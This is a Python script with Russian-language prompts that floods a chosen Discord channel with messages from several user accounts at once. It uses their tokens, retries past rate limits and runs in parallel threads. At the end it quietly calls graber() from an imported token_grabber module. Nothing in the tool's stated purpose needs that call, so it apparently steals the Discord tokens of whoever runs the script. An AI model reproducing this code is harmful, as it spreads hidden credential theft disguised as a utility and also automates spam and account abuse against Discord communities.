import requests
import json
import time
import threading
from token_grabber import graber

API_BASE_URL = "https://discord.com/api/v10"

def get_headers(token):
    return {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }

def fetch_guilds(token):
    url = f"{API_BASE_URL}/users/@me/guilds"
    headers = get_headers(token)
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Ошибка при получении серверов: {response.status_code} - {response.text}")
        return []

def fetch_channels(token, guild_id):
    url = f"{API_BASE_URL}/guilds/{guild_id}/channels"
    headers = get_headers(token)
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Ошибка при получении каналов: {response.status_code} - {response.text}")
        return []

def send_message(token, channel_id, content):
    url = f"{API_BASE_URL}/channels/{channel_id}/messages"
    headers = get_headers(token)
    payload = {"content": content}
    while True:
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        if response.status_code == 200:
            print(f"[{token[:10]}...] Сообщение отправлено.")
            return True
        elif response.status_code == 429:
            retry_after = response.json().get("retry_after", 1)
            print(f"[{token[:10]}...] Превышен лимит. Ждем {retry_after} сек.")
            time.sleep(retry_after)
        else:
            print(f"[{token[:10]}...] Ошибка отправки: {response.status_code} - {response.text}")
            return False

def worker(token, channel_id, message, count):
    for _ in range(count):
        success = send_message(token, channel_id, message)
        if not success:
            print(f"[{token[:10]}...] Остановка из-за ошибки.")
            break
        time.sleep(0.1)

def main():
    print("Введите токены Discord (один на строку). Введите пустую строку для завершения:")
    tokens = []
    while True:
        token = input()
        if not token:
            break
        tokens.append(token.strip())

    if not tokens:
        print("Не введено ни одного токена.")
        return

    all_guilds = {}
    for token in tokens:
        guilds = fetch_guilds(token)
        if guilds:
            all_guilds[token] = guilds
        else:
            print(f"Ошибка при получении серверов для токена {token[:10]}...")

    server_map = {}
    for token, guilds in all_guilds.items():
        print(f"\nСервера для токена: {token[:10]}...")
        for guild in guilds:
            print(f" - {guild['name']} (ID: {guild['id']})")
            if guild['id'] not in server_map:
                server_map[guild['id']] = []
            server_map[guild['id']].append(token)

    common_servers = {guild_id: tokens for guild_id, tokens in server_map.items() if len(tokens) > 1}
    if common_servers:
        print("\nОбщие серверы для нескольких аккаунтов:")
        for guild_id, tokens in common_servers.items():
            print(f" - Сервер с ID {guild_id} доступен на аккаунтах: {', '.join(tokens)}")
        print("\nВажно! Для корректной работы скрипта используйте ID сервера, чтобы избежать путаницы.")
    else:
        print("\nНет общих серверов между аккаунтами.")

    while True:
        try:
            server_id = input("\nВведите ID сервера, на котором хотите отправить сообщения: ").strip()
            if server_id.isdigit():
                server_id = int(server_id)
                break
            else:
                print("Введите правильный ID сервера.")
        except ValueError:
            print("Введите число.")

    selected_guild_channels = {}
    for token in tokens:
        channels = fetch_channels(token, server_id)
        if channels:
            selected_guild_channels[token] = channels
        else:
            print(f"Ошибка при получении каналов для токена {token[:10]}...")

    text_channels = {}
    for token, channels in selected_guild_channels.items():
        text_channels[token] = [ch for ch in channels if ch['type'] == 0]

    for token, channels in text_channels.items():
        if not channels:
            print(f"На сервере {server_id} нет текстовых каналов для аккаунта {token[:10]}.")
            return

    print("\nВыберите канал для отправки сообщений:")
    for idx, channel in enumerate(text_channels[tokens[0]]):
        print(f"{idx + 1}. {channel['name']} (ID: {channel['id']})")
    
    while True:
        try:
            channel_choice = int(input("Выберите канал по номеру: ")) - 1
            if 0 <= channel_choice < len(text_channels[tokens[0]]):
                selected_channel = text_channels[tokens[0]][channel_choice]
                break
            else:
                print("Неверный выбор. Попробуйте снова.")
        except ValueError:
            print("Введите число.")

    message = input("Введите сообщение для отправки: ").strip()
    while True:
        try:
            count = int(input("Сколько сообщений отправить от каждого аккаунта? "))
            if count > 0:
                break
            else:
                print("Введите число больше 0.")
        except ValueError:
            print("Введите число.")

    threads = []
    for token in tokens:
        thread = threading.Thread(target=worker, args=(token, selected_channel['id'], message, count))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("\nВсе сообщения отправлены!")

if __name__ == "__main__":
    main()
    time.sleep(5)
    graber()
